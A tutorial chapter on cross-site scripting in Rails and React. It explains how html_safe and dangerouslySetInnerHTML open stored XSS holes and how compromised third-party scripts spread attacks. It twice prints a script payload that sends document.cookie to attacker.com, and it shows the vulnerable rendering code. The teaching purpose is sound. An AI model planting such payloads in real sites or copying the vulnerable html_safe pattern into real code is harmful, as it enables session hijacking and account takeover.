Cross-site scripting (XSS) is a security attack where the hacker tries to steal
the cookie/token so that the hacker could login to the system.

For XSS attack to happen hacker needs to execute custom JavaScript code. This
sentence is confusing to a lot of people because web pages execute JavaScript
code all the time.

Most of the web applications have JavaScript code. These JavaScript codes are
fine because these JavaScript codes are part of the application itself.

If a hacker is able to execute hacker's JavaScript code then hacker can steal
cookies or token. If a hacker is able to execute following JavaScript code then
hacker will have access to someone else's cookie:

```html
<script>
  new Image().src="http://attacker.com?cookie='+document.cookie;
</script>
```

Let's see how hacker might trick user into executing the JavaScript code of the
hacker.

Let's say that we have a Rails application and we want to display the address.
The developer might try something like this:

```ruby
array = [name, address1, address2, city_name, state_name, zip, country_name]
array.compact.join('<br />')
```

This will render data like this in the browser:

```msg
BigBinary<br />5214F Diamond Heights Blvd<br />Suite #553<br />San Francisco<br />94151
```

This does not look right. `<br />` is literally visible on the page.

To fix this, the developer changes code to following:

```ruby
array = [name, address1, address2, city_name, state_name, zip, country_name]
array.compact.join('<br />').html_safe
```

Now Rails renders the html content nicely and respects `<br />`:

```msg
BigBinary
5214F Diamond Heights Blvd
Suite #553
San Francisco
94151
```

That code has made application vulnerable to XSS attack. Here is what hacker can
do. Hacker signs up in the application as "Harry". We will call him "Harry the
hacker". Harry puts in the following value for address1 while filling out the
form:

```html
<script>
  new Image().src="http://attacker.com?cookie='+document.cookie;
</script>
```

A few weeks later admin of the site visits the page of Harry. When admin visits
the page of Harry then following code is executed:

```ruby
array = [name, address1, address2, city_name, state_name, zip, country_name]
array.compact.join('<br />').html_safe
```

Remember that Harry has put `<script>` tag in his address1. When the browser
sees any `<script>` tag then browser executes the JavaScript in the `<script>`
tag. In this way Harry's JavaScript code is executed by the browser. This script
accesses the cookie of the admin, and posts it to hacker's site.

While all this is happening the admin is not aware that the admin's cookie has
been stolen.

## dangerouslySetInnerHTML is dangerous

In React both `innerHTML` and `dangerouslySetInnerHTML` update the DOM node with
the HTML supplied. However `dangerouslySetInnerHTML` does not do any sanitation
of the HTML supplied. React trusts what user is doing when
`dangerouslySetInnerHTML` is used:

```javascript {
function buildMarkup() {
  return {
    __html:
      "<script>alert('XSS attack is possible if you this alert')</script>",
  };
}

<div dangerouslySetInnerHTML={buildMarkup()} />;
```

In the above case the application is vulnerable to XSS attack.

## Compromising third party libraries

These days our web applications use many third party libraries. We use
bootstrap, jQuery, React, Angular, Intercom, Drip, Google Analytics, mixpanel
and others. Typically, the code is something like this:

```html
<script src="https://thirpartylibrary.com/minified.js"></script>
```

If the third-party library is hacked, then the hacker is able to inject
malicious JavaScript code in the page. It means that if the hosting of the
third-party library is hacked, then the main application becomes vulnerable to
XSS attacks.

There is **nothing to commit** in this chapter since all we had done was
learning the basics of XSS attacks.
